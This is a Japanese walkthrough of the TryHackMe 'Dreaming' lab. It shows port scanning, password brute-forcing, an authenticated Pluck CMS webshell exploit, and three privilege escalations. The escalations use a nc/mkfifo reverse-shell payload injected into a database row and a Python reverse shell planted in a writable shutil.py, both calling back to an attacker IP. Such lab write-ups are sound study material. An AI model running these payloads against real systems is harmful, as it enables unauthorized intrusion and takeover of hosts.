# Dreaming CTF

https://tryhackme.com/room/dreaming

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.31.244
root@ip-10-10-100-69:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-20 23:41 GMT
Nmap scan report for 10.10.31.244
Host is up (0.000097s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:7A:6D:09:FE:05 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.22 seconds
root@ip-10-10-100-69:~# sudo nmap -sV -p22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-20 23:41 GMT
Nmap scan report for 10.10.31.244
Host is up (0.000086s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
MAC Address: 02:7A:6D:09:FE:05 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSH,HTTP

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://$TARGET -w ./dirlist.txt -t 30

/.php                 (Status: 403) [Size: 277]
/app                  (Status: 301) [Size: 310] [--> http://10.10.31.244/app/]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
```

/app を発見。アクセスすると下記のパスに誘導される。

http://10.10.31.244/app/pluck-4.7.13/?file=dreaming

admin のログイン画面もある。パスワードを入力するのみ。

http://10.10.31.244/app/pluck-4.7.13/login.php

また、```pluck 4.7.13```と表示されている。

脆弱性検索

```shell
Pluck CMS 4.7 - Directory Traversal                                               | php/webapps/36986.txt
Pluck CMS 4.7 - HTML Code Injection                                               | php/webapps/27398.txt
Pluck CMS 4.7 - Multiple Local File Inclusion / File Disclosure Vulnerabilities   | php/webapps/36129.txt
Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated)              | php/webapps/49909.py
Pluck CMS 4.7.16 - Remote Code Execution (RCE) (Authenticated)                    | php/webapps/50826.py
```

RCEには認証情報が必要なのでパスワードが欲しい。

ブルートフォースをかけると、攻撃が検知されて5分間待たされた。

```shell
ffuf -w /usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -X POST -d "cont1=FUZZ&bogus=&submit=Log+in" -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: PHPSESSID=s7n4vjlntsfjqbs6i32mel8a2g" -u http://10.10.31.244/app/pluck-4.7.13/login.php -fr "Password incorrect"
```

結局、password が正解だった。

## エクスプロイト

```shell
$ python ./49909.py 10.10.31.244 80 password /app/pluck-4.7.13/

Authentification was succesfull, uploading webshell

Uploaded Webshell to: http://10.10.31.244:80/app/pluck-4.7.13//files/shell.phar
```
Webシェルアップロード成功

```shell
p0wny@shell:â¦/pluck-4.7.13/files# ls -al /home
total 20
drwxr-xr-x  5 root     root     4096 Jul 28  2023 .
drwxr-xr-x 20 root     root     4096 Jul 28  2023 ..
drwxr-xr-x  4 death    death    4096 Aug 25  2023 death
drwxr-xr-x  5 lucien   lucien   4096 Aug 25  2023 lucien
drwxr-xr-x  3 morpheus morpheus 4096 Aug  7  2023 morpheus
```

```shell
p0wny@shell:â¦/pluck-4.7.13/files# ls -al /home/lucien
total 44
drwxr-xr-x 5 lucien lucien 4096 Aug 25  2023 .
drwxr-xr-x 5 root   root   4096 Jul 28  2023 ..
-rw------- 1 lucien lucien  684 Aug 25  2023 .bash_history
-rw-r--r-- 1 lucien lucien  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 lucien lucien 3771 Feb 25  2020 .bashrc
drwx------ 3 lucien lucien 4096 Jul 28  2023 .cache
drwxrwxr-x 4 lucien lucien 4096 Jul 28  2023 .local
-rw------- 1 lucien lucien  696 Aug 25  2023 .mysql_history
-rw-r--r-- 1 lucien lucien  807 Feb 25  2020 .profile
drwx------ 2 lucien lucien 4096 Jul 28  2023 .ssh
-rw-r--r-- 1 lucien lucien    0 Jul 28  2023 .sudo_as_admin_successful
-rw-rw---- 1 lucien lucien   19 Jul 28  2023 lucien_flag.txt
```

```shell
p0wny@shell:â¦/pluck-4.7.13/files# ls -al /home/death
total 56
drwxr-xr-x 4 death death 4096 Aug 25  2023 .
drwxr-xr-x 5 root  root  4096 Jul 28  2023 ..
-rw------- 1 death death  427 Aug 25  2023 .bash_history
-rw-r--r-- 1 death death  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 death death 3771 Feb 25  2020 .bashrc
drwx------ 3 death death 4096 Jul 28  2023 .cache
drwxrwxr-x 4 death death 4096 Jul 28  2023 .local
-rw------- 1 death death  465 Aug 25  2023 .mysql_history
-rw-r--r-- 1 death death  807 Feb 25  2020 .profile
-rw------- 1 death death 8157 Aug  7  2023 .viminfo
-rw-rw-r-- 1 death death  165 Jul 29  2023 .wget-hsts
-rw-rw---- 1 death death   21 Jul 28  2023 death_flag.txt
-rwxrwx--x 1 death death 1539 Aug 25  2023 getDreams.py
```

```shell
p0wny@shell:â¦/pluck-4.7.13/files# ls -al /home/morpheus
total 44
drwxr-xr-x 3 morpheus morpheus 4096 Aug  7  2023 .
drwxr-xr-x 5 root     root     4096 Jul 28  2023 ..
-rw------- 1 morpheus morpheus   58 Aug 14  2023 .bash_history
-rw-r--r-- 1 morpheus morpheus  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 morpheus morpheus 3771 Feb 25  2020 .bashrc
drwxrwxr-x 3 morpheus morpheus 4096 Jul 28  2023 .local
-rw-r--r-- 1 morpheus morpheus  807 Feb 25  2020 .profile
-rw-rw-r-- 1 morpheus morpheus   66 Jul 28  2023 .selected_editor
-rw-rw-r-- 1 morpheus morpheus   22 Jul 28  2023 kingdom
-rw-rw---- 1 morpheus morpheus   28 Jul 28  2023 morpheus_flag.txt
-rw-rw-r-- 1 morpheus morpheus  180 Aug  7  2023 restore.py
```

## 権限昇格１

質問の順番から、lucienへの昇格を目指す。

```shell
www-data@dreaming:/home/lucien$ find / -user lucien -type f 2>/dev/null
/opt/test.py
```

所有ファイル発見。

```shell
www-data@dreaming:/home/lucien$ ls -al /opt/test.py
-rwxr-xr-x 1 lucien lucien 483 Aug  7  2023 /opt/test.py
www-data@dreaming:/home/lucien$ cat /opt/test.py
import requests

#Todo add myself as a user
url = "http://127.0.0.1/app/pluck-4.7.13/login.php"
password = "ひみつ"

data = {
        "cont1":password,
        "bogus":"",
        "submit":"Log+in"
        }

req = requests.post(url,data=data)

if "Password correct." in req.text:
    print("Everything is in proper order. Status Code: " + str(req.status_code))
else:
    print("Something is wrong. Status Code: " + str(req.status_code))
    print("Results:\n" + req.text)
```

このパスワードを使い、lucienに昇格できた。

```shell
www-data@dreaming:/home/lucien$ su lucien
Password: 
lucien@dreaming:~$ 
```

```shell
lucien@dreaming:~$ cat lucien_flag.txt
THM{............}
```

フラグ１ゲット。

## 権限昇格２

次に、deathへの昇格を目指す。

```shell
lucien@dreaming:~$ ls -al /opt/getDreams.py
-rwxrw-r-- 1 death death 1574 Aug 15  2023 /opt/getDreams.py
lucien@dreaming:~$ ls -al /home/death/getDreams.py
-rwxrwx--x 1 death death 1539 Aug 25  2023 /home/death/getDreams.py
```

getDreams.py が２か所にあり、パーミッションが非対称。

/opt のコードを読む。

```python
import mysql.connector
import subprocess

# MySQL credentials
DB_USER = "death"
DB_PASS = "#redacted"
DB_NAME = "library"

import mysql.connector
import subprocess

def getDreams():
    try:
        # Connect to the MySQL database
        connection = mysql.connector.connect(
            host="localhost",
            user=DB_USER,
            password=DB_PASS,
            database=DB_NAME
        )

        # Create a cursor object to execute SQL queries
        cursor = connection.cursor()

        # Construct the MySQL query to fetch dreamer and dream columns from dreams table
        query = "SELECT dreamer, dream FROM dreams;"

        # Execute the query
        cursor.execute(query)

        # Fetch all the dreamer and dream information
        dreams_info = cursor.fetchall()

        if not dreams_info:
            print("No dreams found in the database.")
        else:
            # Loop through the results and echo the information using subprocess
            for dream_info in dreams_info:
                dreamer, dream = dream_info
                command = f"echo {dreamer} + {dream}"
                shell = subprocess.check_output(command, text=True, shell=True)
                print(shell)

    except mysql.connector.Error as error:
        # Handle any errors that might occur during the database connection or query execution
        print(f"Error: {error}")

    finally:
        # Close the cursor and connection
        cursor.close()
        connection.close()

# Call the function to echo the dreamer and dream information
getDreams()
```

パスワードは隠されているが、DBにアクセスしている。

次に、/home/death のスクリプトを実行する。  
普通には実行できなかったが、sudo が付いていた。

```shell
lucien@dreaming:/home/death$ sudo -l
Matching Defaults entries for lucien on dreaming:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lucien may run the following commands on dreaming:
    (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
```

```shell
lucien@dreaming:/home/death$ sudo -u death python3 /home/death/getDreams.py
Alice + Flying in the sky

Bob + Exploring ancient ruins

Carol + Becoming a successful entrepreneur

Dave + Becoming a professional musician
```

出力は役に立たないが、下記の部分でecho が相対パスになっているのを悪用できるか？

```shell
command = f"echo {dreamer} + {dream}"
shell = subprocess.check_output(command, text=True, shell=True)
```

→ sudo で env_reset が設定されているので不可能。

DBにデータ挿入できるならコマンドインジェクション可能だが、接続手段が必要。

.bash_history に接続情報が出ていた。

```
mysql -u lucien -p.....................
```

### mysql

DB接続し、リバースシェルのコードを挿入。

```shell
mysql> select * from dreams;
+---------+------------------------------------------------------------------------------+
| dreamer | dream                                                                        |
+---------+------------------------------------------------------------------------------+
| Alice   | Flying in the sky                                                            |
| Bob     | Exploring ancient ruins                                                      |
| Carol   | Becoming a successful entrepreneur                                           |
| Dave    | Becoming a professional musician                                             |
| aaa     | $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.2.22.182 6667 >/tmp/f) |
+---------+------------------------------------------------------------------------------+
```

```shell
$ nc -nvlp 6667
listening on [any] 6667 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.31.244] 50486
$ id
uid=1001(death) gid=1001(death) groups=1001(death)
```

death に昇格成功。

```shell
$ cat death_flag.txt
THM{...............}
```

フラグ２ゲット。

/home/death/getDreams.py
```shell
DB_USER = "death"
DB_PASS = "ひみつ"
DB_NAME = "library"
```

DBの接続パスワードと同じだったので、以降はSSHでdeathに接続できる。

## 権限昇格３

最後に、morpheus への昇格を目指す。

```shell
death@dreaming:~$ ls -al /home/morpheus
total 44
drwxr-xr-x 3 morpheus morpheus 4096 Aug  7  2023 .
drwxr-xr-x 5 root     root     4096 Jul 28  2023 ..
-rw------- 1 morpheus morpheus   58 Aug 14  2023 .bash_history
-rw-r--r-- 1 morpheus morpheus  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 morpheus morpheus 3771 Feb 25  2020 .bashrc
-rw-rw-r-- 1 morpheus morpheus   22 Jul 28  2023 kingdom
drwxrwxr-x 3 morpheus morpheus 4096 Jul 28  2023 .local
-rw-rw---- 1 morpheus morpheus   28 Jul 28  2023 morpheus_flag.txt
-rw-r--r-- 1 morpheus morpheus  807 Feb 25  2020 .profile
-rw-rw-r-- 1 morpheus morpheus  180 Aug  7  2023 restore.py
-rw-rw-r-- 1 morpheus morpheus   66 Jul 28  2023 .selected_editor
```

```shell
death@dreaming:/home/morpheus$ cat kingdom
We saved the kingdom!

death@dreaming:/home/morpheus$ cat restore.py 
from shutil import copy2 as backup

src_file = "/home/morpheus/kingdom"
dst_file = "/kingdom_backup/kingdom"

backup(src_file, dst_file)
print("The kingdom backup has been done!")
```

```shell
ls -al /
drwxrwxr--   2 root saviors       4096 Jul 28  2023 kingdom_backup
```

```shell
death@dreaming:/home/morpheus$ ls -al /kingdom_backup
ls: cannot access '/kingdom_backup/..': Permission denied
ls: cannot access '/kingdom_backup/.': Permission denied
ls: cannot access '/kingdom_backup/kingdom': Permission denied
total 0
d????????? ? ? ? ?            ? .
d????????? ? ? ? ?            ? ..
-????????? ? ? ? ?            ? kingdom
```

よくわからない。  
/kingdom_backup/kingdom に morpheus のパスワードが書かれているのだろうか？  
また、saviorsグループも、SGID、グループオーナーを調べても何も出ないのでよくわからない。  
saviors グループに手掛かりは見つからなかった。

restore.py がどこからか実行されるとして、悪用できる可能性があるとしたら、shutil の backupメソッド（copy2）を変更できる場合しか考えられない。

```shell
death@dreaming:/home/morpheus$ find / -type f -name "*shutil*" 2>/dev/null
/usr/lib/python3.8/shutil.py
/usr/lib/python3.8/__pycache__/shutil.cpython-38.pyc
/usr/lib/byobu/include/shutil
/usr/lib/python3/dist-packages/twisted/words/test/__pycache__/test_xishutil.cpython-38.pyc
/usr/lib/python3/dist-packages/twisted/words/test/test_xishutil.py
/snap/core20/1974/usr/lib/python3.8/__pycache__/shutil.cpython-38.pyc
/snap/core20/1974/usr/lib/python3.8/shutil.py
/snap/core20/2015/usr/lib/python3.8/__pycache__/shutil.cpython-38.pyc
/snap/core20/2015/usr/lib/python3.8/shutil.py

death@dreaming:/home/morpheus$ ls -al /usr/lib/python3.8/shutil.py
-rw-rw-r-- 1 root death 51474 Aug  7  2023 /usr/lib/python3.8/shutil.py
```

deathグループに書き込み権限が付けられていた。

リバースシェルを実行するよう、copy2メソッドを変更。

```python
def copy2(src, dst, *, follow_symlinks=True):
    """Copy data and metadata. Return the file's destination.

    Metadata is copied with copystat(). Please see the copystat function
    for more information.

    The destination may be a directory.

    If follow_symlinks is false, symlinks won't be followed. This
    resembles GNU's "cp -P src dst".
    """
    #if os.path.isdir(dst):
    #    dst = os.path.join(dst, os.path.basename(src))
    #copyfile(src, dst, follow_symlinks=follow_symlinks)
    #copystat(src, dst, follow_symlinks=follow_symlinks)
    #return dst
    import socket,subprocess,os;
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
    s.connect(("10.2.22.182",6667));
    os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
    os.dup2(s.fileno(),2);
    import pty;
    pty.spawn("sh");
```

```shell
$ nc -nvlp 6667
listening on [any] 6667 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.0.178] 37690
$ id
id
uid=1002(morpheus) gid=1002(morpheus) groups=1002(morpheus),1003(saviors)
```

シェル取得成功。

```shell
$ cat morpheus_flag.txt
cat morpheus_flag.txt
THM{................}
```

フラグ３ゲット！

## 振り返り

- 手動で password を発見するのが難しかった。最低限、手で実行すべき数件程度のパスワードリストを作っておくべきかもしれない。
- 昇格したとき、「次に昇格したいグループオーナー」で検索しがちだが、「いま昇格したグループオーナー」で検索することも大事。（今回でいうと、deathグループに昇格したとき death グループオーナーのファイルを検索すれば異常にすぐ気づいたはず）
